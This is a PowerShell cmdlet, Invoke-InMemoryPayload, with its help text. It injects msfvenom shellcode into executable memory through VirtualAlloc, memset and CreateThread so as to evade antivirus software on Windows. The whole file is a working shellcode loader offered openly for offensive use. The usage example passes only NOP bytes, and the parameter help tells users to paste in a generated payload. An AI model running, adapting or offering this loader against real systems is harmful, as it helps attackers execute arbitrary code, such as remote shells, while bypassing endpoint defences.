Function Invoke-InMemoryPayload {
<#
.SYNOPSIS
Injects an msfvenom payload into a Windows machines memory as a way to attempt evading Anti-Virus protections. This was built thanks to information from the Offensive Security PWK Course


.DESCRIPTION
This cmdlet is used to attempt bypassing AV software by injecting shell code in a byte arrary into a separate thread of specially allocated memory. It is possible that this will not be able to execute a certain Windows devices as the DLLs or user permissions may prevent the execution of this function.


.EXAMPLE
Invoke-InMemoryPayload -ShellCode 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
# This command injects NOP bits into a separate thread of specially allocated memory on a Windows machine.


.PARAMETER ShellCode
This parameter accepts byte input only. Qutations should not be used around your defined bytes as this will convert your bytes to strings


.INPUTS
[System.Byte[]]


.OUTPUTS
None


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286

#>
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage='Generate an msfvenom payload. Copy the value of the byte variable and place it here.')]  # End Parameter
            [Byte[]]$ShellCode
        )  # End param

    Write-Verbose -Message "Importing DLL's..."
    $CSCode = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

    $WinFunc = Add-Type -MemberDefinition $CSCode -Name "Win32" -Namespace "Win32Functions" -PassThru
    $Size = 0x1000

    If ($ShellCode.Length -gt 0x1000) {

        $Size = $ShellCode.Length
        Write-Verbose -Message "Length of payload is $Size"

    }  # End If

    Write-Verbose "Allocating a block of memory for execution using VirtualAlloc()..."
    $X = $WinFunc::VirtualAlloc(0,$Size,0x3000,0x40)

    Write-Verbose -Message "Writing payload to newly allocated memory block using memset()..."
    For ( $i = 0 ; $i -le ($ShellCode.Length - 1); $i++ ) {

        Try {

            $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $ShellCode[$i], 1)

        } Catch [Exception] {

            Write-Error -Message $Error[0]
            Throw "[x] There was an error executing payload. Cmdlet is being prevented from allocating memory with the utilized DLLs."

        } Catch {

            Throw "[x] I have not caught this error before. Please email me the results at rosborne@osbornepro.com"

        }  # End Try Catch Catch

    }  # End For

    Write-Verbose -Message "Executing in separte thread using CreateThread()..."
    $WinFunc::CreateThread(0,0,$X,0,0,0)
    For (;;) {

        Start-Sleep -Seconds 60

    }  # End For

}  # End Invoke-InMemoryPayload
